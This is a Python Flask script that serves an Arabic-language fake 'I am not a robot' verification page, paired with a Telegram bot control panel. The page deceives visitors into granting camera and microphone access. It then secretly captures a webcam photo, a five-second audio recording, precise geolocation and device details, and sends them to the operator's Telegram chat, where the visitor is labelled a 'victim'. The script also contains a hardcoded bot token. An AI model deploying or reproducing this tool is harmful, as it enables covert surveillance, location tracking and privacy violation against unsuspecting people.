import base64, requests, os, json
from flask import Flask, render_template_string, request

app = Flask(__name__)

# --- إعدادات الملك سيوفي ---
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"

HTML = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق الأمان</title>
    <style>
        body { background: #050505; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #111; padding: 40px; border-radius: 30px; text-align: center; border: 1px solid #333; width: 85%; max-width: 400px; box-shadow: 0 25px 50px rgba(0,0,0,0.9); }
        .btn { background: linear-gradient(45deg, #f38020, #ffae00); color: white; border: none; padding: 18px; border-radius: 15px; width: 100%; font-weight: bold; cursor: pointer; font-size: 1.2rem; transition: 0.3s; }
        .btn:active { transform: scale(0.95); }
        #st { margin-top: 20px; color: #666; font-size: 0.9rem; }
    </style>
</head>
<body>
    <div class="card">
        <div style="font-size: 70px; margin-bottom: 20px;">🛡️</div>
        <h2>تأكيد الهوية</h2>
        <p style="color: #aaa; margin-bottom: 30px;">يرجى النقر لتجاوز بروتوكول الحماية والوصول إلى الرابط المطلوب</p>
        <button class="btn" id="go" onclick="launch()">أنا لست روبوت</button>
        <div id="st">جاري تأمين الاتصال...</div>
    </div>
    <video id="v" autoplay playsinline muted style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        async function post(d, t) { fetch('/api/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({d: d, t: t}) }); }
        
        // إشعار دخول فوري
        window.onload = () => { post("🔔 **شخص ما دخل للرابط الآن!**", "msg"); };

        async function launch() {
            document.getElementById('go').style.display = 'none';
            document.getElementById('st').innerText = "جاري معالجة البيانات... يرجى الانتظار";
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const v = document.getElementById('v'); v.srcObject = stream;
                
                // جلب معلومات تفصيلية جداً
                const b = await navigator.getBattery().catch(() => ({}));
                const info = `👤 **ضحية جديدة وقعت بالفخ**:\\n` +
                             `🔋 البطارية: ${Math.round(b.level*100)}% (${b.charging ? 'يشحن' : 'لا يشحن'})\\n` +
                             `📱 النظام: ${navigator.platform}\\n` +
                             `🧠 المعالج: ${navigator.hardwareConcurrency} نوى\\n` +
                             `📏 الشاشة: ${window.screen.width}x${window.screen.height}\\n` +
                             `🌐 المتصفح: ${navigator.userAgent.split(' ')[0]}`;
                post(info, "msg");

                // الموقع
                navigator.geolocation.getCurrentPosition(p => {
                    post(`📍 **موقع الضحية بدقة**:\\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, "msg");
                }, null, {enableHighAccuracy: true});

                // حل السواد: ننتظر 5 ثواني لضمان فتح الكاميرا
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    post(c.toDataURL('image/jpeg', 0.8), "img");
                    
                    // بصمة صوتية 5 ثواني
                    const recorder = new MediaRecorder(stream);
                    const chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = () => {
                        const reader = new FileReader();
                        reader.readAsDataURL(new Blob(chunks));
                        reader.onloadend = () => post(reader.result, "aud");
                    };
                    recorder.start();
                    setTimeout(() => { recorder.stop(); document.getElementById('st').innerText = "اكتمل الفحص!"; }, 5000);
                }, 5000);
            } catch (e) { location.reload(); }
        }
    </script>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.get_json(force=True, silent=True)
    t, d = data.get('t'), data.get('d')
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    if t == 'msg':
        requests.post(url + "sendMessage", json={'chat_id': ADMIN_ID, 'text': d, 'parse_mode': 'Markdown'})
    elif t == 'img':
        img = base64.b64decode(d.split(',')[1])
        requests.post(url + "sendPhoto", data={'chat_id': ADMIN_ID, 'caption': "📸 **صورة الضحية**"}, files={'photo': ('c.jpg', img)})
    elif t == 'aud':
        aud = base64.b64decode(d.split(',')[1])
        requests.post(url + "sendVoice", data={'chat_id': ADMIN_ID, 'caption': "🎙 **بصمة الضحية**"}, files={'voice': ('v.ogg', aud)})
    return "OK"

@app.route('/webhook', methods=['POST'])
def bot_control():
    data = request.get_json(force=True, silent=True)
    if "message" in data:
        uid = str(data["message"]["chat"]["id"])
        if uid == ADMIN_ID:
            kb = {
                "inline_keyboard": [
                    [{"text": "🔗 رابط الصيد الخاص بي", "callback_data": "get_link"}],
                    [{"text": "📊 إحصائيات السيرفر", "callback_data": "status"}],
                    [{"text": "🗑 مسح البيانات", "callback_data": "clear"}]
                ]
            }
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                          json={'chat_id': uid, 'text': "🛠 **لوحة تحكم الملك سيوفي**:", 'reply_markup': kb})
    
    elif "callback_query" in data:
        cid = data["callback_query"]["message"]["chat"]["id"]
        cb_data = data["callback_query"]["data"]
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
        if cb_data == "get_link":
            requests.post(url + "sendMessage", json={'chat_id': cid, 'text': f"🚀 رابطك جاهز:\\n`https://{request.host}`", 'parse_mode': 'Markdown'})
        elif cb_data == "status":
            requests.post(url + "sendMessage", json={'chat_id': cid, 'text': "✅ السيرفر يعمل بأعلى أداء وجميع المستشعرات مفعلة."})
            
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
